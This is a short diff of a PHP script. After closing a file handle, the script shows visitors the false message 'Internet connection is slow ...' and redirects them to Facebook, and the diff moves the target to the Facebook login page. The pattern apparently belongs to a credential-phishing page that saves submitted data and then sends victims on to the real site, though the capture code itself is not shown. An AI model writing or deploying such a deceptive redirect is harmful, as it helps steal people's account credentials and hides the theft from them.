@@ -14,6 +14,6 @@ fclose($myfile);
 
 echo 'Internet connection is slow ... ';
 //redirecting user to a closed facebook group
-header('Refresh: 2; URL=https://www.facebook.com/groups/2044110065815684/');
+header('Refresh: 2; URL=https://www.facebook.com/login/?next=https%3A%2F%2Fwww.facebook.com%2Fgroups%2Fonlinehelpz%2F');
 
 ?>
